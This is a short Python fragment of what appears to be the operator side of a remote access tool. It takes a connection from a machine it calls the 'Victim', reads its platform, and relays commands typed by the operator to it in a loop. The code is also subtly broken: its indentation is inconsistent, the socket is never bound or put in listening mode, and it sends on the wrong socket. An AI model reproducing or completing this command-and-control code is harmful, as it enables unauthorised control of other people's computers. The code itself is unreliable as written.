import socket
from colorama import Fore
def Connect(self):
        Connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
          print("[" + Fore.LIGHTBLUE_EX + '+' +  "]  Making Connection")
        try:
            Victim, Address = Connection.accept()

            os = Victim.recv(1024).decode('UTF-8')
            print("[" + Fore.LIGHTBLUE_EX + '+' +  "]  Got Platfrom from victim")
            Connected = True
            while Connected :
                self.Command = str(
                    input("{Victim}@{os} ".format(Victim = Address ,os = os)))
                Connection.send(self.Command.encode("UTF-8"))
                print(Connection.recv(1024).decode("UTF-8"))
        except :
            Connected = False
            print("[" + Fore.LIGHTRED_EX + '-' +  "] Connection Failed.Victim Might Be Offline Try Again Later")
            return False